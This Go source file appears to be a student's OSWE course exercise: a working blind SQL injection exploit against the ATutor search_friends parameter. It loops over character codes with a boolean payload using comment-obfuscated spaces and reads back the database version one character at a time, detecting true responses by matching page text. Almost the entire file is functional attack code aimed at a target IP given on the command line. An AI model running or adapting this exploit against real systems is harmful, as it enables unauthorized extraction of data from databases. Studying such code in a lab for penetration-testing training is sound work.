package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/iPhantasmic/OSWE/scripts/utils"
	"log"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

// Ex 3.5.2.2 - Extra Mile: Vulnerability in search_friend request parameter

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func sendSearchFriendsSQLiExtra(ip string, sqliPayload string) int {
	for i := 32; i < 126; i++ {
		// do necessary URL manipulation
		updatedPayload := strings.Replace(sqliPayload, "[CHAR]", fmt.Sprintf("%d", i), -1)
		requestURL := fmt.Sprintf("http://%s/ATutor/mods/_standard/social/index_public.php?search_friends=%s", ip, updatedPayload)

		// send the request
		//contentLength := utils.SendGetRequest(client, true, requestURL).ContentLength
		//if contentLength > 28728 {
		//	return i
		//}

		// **** for some reason, the content length does not return properly when the proxy is not used
		// **** when the proxy is used, the content length varies due to randkey changes between true/false requests
		// **** so we will use regex instead to be more certain

		// regex
		response := utils.SendGetRequest(client, false, requestURL)
		match, _ := regexp.MatchString("There are 1 entries", response.ResponseBody)
		if match {
			return i
		}
	}

	return 0
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	//debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-proxy] <target>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.121.103", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{Transport: tr}

	utils.PrintInfo("Extracting DB Version: ")
	for i := 1; i < 20; i++ {
		sqliPayload := fmt.Sprintf("test')/**/or/**/(ascii(substring((select/**/version()),%d,1)))=[CHAR]%%23", i)
		extractedChar := fmt.Sprintf("%c", sendSearchFriendsSQLiExtra(ip, sqliPayload))
		fmt.Print(extractedChar)
	}

	fmt.Println("")
	utils.PrintSuccess("Done!")
}
